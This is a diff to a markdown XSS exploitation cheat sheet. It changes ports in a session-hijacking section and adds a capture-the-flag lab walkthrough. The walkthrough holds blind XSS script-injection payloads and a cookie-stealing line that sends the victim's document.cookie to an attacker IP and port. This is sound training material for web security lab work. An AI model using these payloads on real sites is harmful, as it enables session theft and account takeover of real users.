@@ -14,6 +14,7 @@ This document summarizes core techniques for identifying and exploiting **Cross-
   - [Automated XSS Discovery](#automated-xss-discovery)
   - [XSS Attacks - Phishing](#xss-attacks---phishing)
   - [XSS Attacks - Session Hijacking](#xss-attacks---session-hijacking)
+  - [Exploitation Example - Walkthrough](#exploitation-example---walkthrough)
 
 ---
 
@@ -418,14 +419,14 @@ Prepare a directory to host scripts and start a web server:
 ```bash
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
-sudo php -S 0.0.0.0:8080
+sudo php -S 0.0.0.0:8001
 ```
 
 **Step 2: Identify the Vulnerable Field**
 
 Inject payloads into different form fields, adjusting the requested path to identify which field executes the payload:
 
-```
+```javascript
 "><script src=http://10.10.14.172:8001/fullname></script>
 
 "><script src=http://10.10.14.172:8001/username></script>
@@ -458,7 +459,7 @@ new Image().src='http://OUR_IP:PORT/?c='+document.cookie;
 Inject a payload into the `profile` field that loads the malicious JavaScript file from the attacker-controlled server:
 
 ```javascript
-"><script src=http://10.10.14.172:8080/script.js></script>
+"><script src=http://10.10.14.172:8001/script.js></script>
 ```
 
 Once executed, the victim’s browser sends the session cookie to the attacker’s server.
@@ -480,3 +481,93 @@ After refreshing the page, the attacker gains authenticated access as the victim
 ![Filtered output](images/session-hijacking5.png)
 
 ---
+
+## Exploitation Example - Walkthrough
+
+In this exercise, we are tasked with demonstrating practical XSS exploitation skills by attacking a vulnerable web application and retrieving a flag. 
+
+To successfully complete the assessment, we must achieve the following objectives:
+
+- Identify a user-controlled input vulnerable to XSS
+- Craft and deliver a working XSS payload
+- Hijack a victim’s session cookie containing the flag
+
+The target application is available at:
+
+```
+http://10.129.221.80/assessment/
+```
+
+The application appears to be a security-focused blog.
+
+![Filtered output](images/skill-assessment.png)
+
+A comment section is present on the blog, containing multiple user-input fields. Comment sections are common attack surfaces and prime candidates for XSS testing.
+
+![Filtered output](images/skill-assessment2.png)
+
+After submitting a test comment, the application responds with a message indicating that comments require **administrative approval**.
+
+![Filtered output](images/skill-assessment3.png)
+
+This behavior strongly suggests the presence of a **blind XSS vulnerability**, as the injected payload is likely rendered in an administrative interface that we do not have direct access to. As a result, we must rely on **out-of-band interaction** to confirm payload execution and exfiltrate data.
+
+**Step 1: Start a Listening Server**
+
+We begin by preparing a directory to host our payloads and starting a local web server to receive callbacks from the victim’s browser:
+
+```bash
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+sudo php -S 0.0.0.0:8001
+```
+
+**Step 2: Identify the Vulnerable Field**
+
+To determine which input field is vulnerable, we inject test payloads into multiple fields. Each payload references a unique URL path corresponding to the field name. When the payload executes, the browser will request that path from our server, allowing us to identify the vulnerable field.
+
+The `email` field is typically skipped, as it often enforces strict format validation.
+
+```javascript
+"><script src=http://10.10.14.172:8001/comment></script>
+
+"><script src=http://10.10.14.172:8001/name></script>
+
+"><script src=http://10.10.14.172:8001/website></script>
+```
+
+A request is received for the `/website` path, confirming that the `website` field is vulnerable to blind XSS.
+
+![Filtered output](images/skill-assessment4.png)
+
+**Step 3: Create the Cookie-Stealing Script**
+
+Next, we create a JavaScript file (`script.js`) that exfiltrates the victim’s session cookie to our listening server:
+
+```javascript
+new Image().src='http://10.10.14.172:8001/?c='+document.cookie;
+```
+
+This technique avoids restrictions on cross-origin requests and reliably transmits the cookie via a simple GET request.
+
+**Step 4: Deliver the Final Payload**
+
+We inject a final payload into the vulnerable `website field`, instructing the victim’s browser to load and execute our malicious JavaScript file:
+
+```javascript
+"><script src=http://10.10.14.172:8001/script.js></script>
+```
+
+![Filtered output](images/skill-assessment5.png)
+
+When an administrator reviews the comment, the payload executes, and the session cookie is sent to our server.
+
+The exfiltrated session cookie contains the final flag, completing the assessment successfully:
+
+```
+HTB{cr055_5173_5cr1p71n6_n1nj4}
+```
+
+![Filtered output](images/skill-assessment6.png)
+
+
